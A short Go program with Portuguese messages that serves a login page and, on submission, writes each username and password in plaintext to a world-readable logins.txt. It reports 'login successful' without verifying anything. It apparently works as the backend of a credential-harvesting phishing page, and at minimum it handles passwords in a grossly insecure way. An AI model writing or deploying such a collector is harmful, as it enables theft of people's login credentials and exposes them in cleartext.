package main

import (
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
)

func main() {
	http.HandleFunc("/", renderLogin)
	http.HandleFunc("/login", handleLogin)
	fmt.Println("Servidor iniciado na porta 8080...")
	log.Fatal(http.ListenAndServe(":8080", nil))
}

func renderLogin(w http.ResponseWriter, r *http.Request) {
	tmpl, err := template.ParseFiles("templates/login.html")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, nil)
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Método não permitido", http.StatusMethodNotAllowed)
		return
	}

	username := r.FormValue("username")
	password := r.FormValue("password")

	file, err := os.OpenFile("logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Erro ao abrir o arquivo: %v", err)
		http.Error(w, "Não foi possível salvar os dados", http.StatusInternalServerError)
		return
	}
	defer file.Close()

	_, err = file.WriteString(fmt.Sprintf("Nome de usuário: %s, Senha: %s\n", username, password))
	if err != nil {
		log.Printf("Erro ao escrever no arquivo: %v", err)
		http.Error(w, "Não foi possível salvar os dados", http.StatusInternalServerError)
		return
	}

	fmt.Fprintf(w, "Login bem-sucedido!")
}
